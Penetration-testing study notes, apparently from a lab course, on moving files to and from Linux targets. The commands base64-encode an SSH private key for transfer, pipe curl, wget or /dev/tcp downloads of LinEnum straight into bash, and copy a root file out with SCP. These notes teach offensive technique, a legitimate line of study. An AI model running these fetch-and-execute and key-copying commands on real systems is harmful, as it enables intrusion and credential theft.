
---
### Base64

---
Encode SSH key to Base64
```bash
cat id_rsa |base64 -w 0;echo
#-w 0: Create only one line and end up with the command with ;
#echo: To start a new line and make it easier to copy.
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSk...
```

Decode the file
```bash
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSk...' | base64 -d > id_rsa
#-n : Ignore \n in the end of the string.
```

### Web Downloads with Wget and cURL

---
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Fileless Attacks 

---
Take advantage of pipes operate, we don't have to download a file to execute it in most cases.

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

### Bash (/dev/tcp)

---
As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

Connect to the Target Webserver
```bash
exec 3<>/dev/tcp/10.10.10.32/80
#exec + <>(Redirector): File Descriptor
#3<>: 0 stdin, 1 stdout, 2 stderr, 3-9 custom, a two-way data flow
```

HTTP GET Request
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
#-e: Escape characters, \n will convert to newline with this switch.
#\n\n: The format constrain of HTTP between Header and Body.
#>: Write 
#3&: FD with id 3
#Data will be sotred in the FD 3 buffer
```

Print the Response
```bash
cat <&3
```

Execute it
```bash
cat <&3 | bash
```

### SSH Downloads

---
SSH implementation comes with an `SCP` utility for remote file transfer that, by default, uses the SSH protocol.

`SCP` (secure copy) is a command-line utility that allows you to copy files and directories between two hosts securely, which is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.

Set up an SSH server in our Linux
```bash
hcx05@htb[/htb]$ sudo systemctl enable ssh
#Enable ssh while power on

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install. Executing: /lib/systemd/systemd-sysv-install enable ssh Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45 
...SNIP...

hcx05@htb[/htb]$ sudo systemctl start ssh
```

Checking for SSH Listening Port
```bash
hcx05@htb[/htb]$ sudo ss -nlpt
```

Download Files Using SCP
```bash
hcx05@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt .
```


































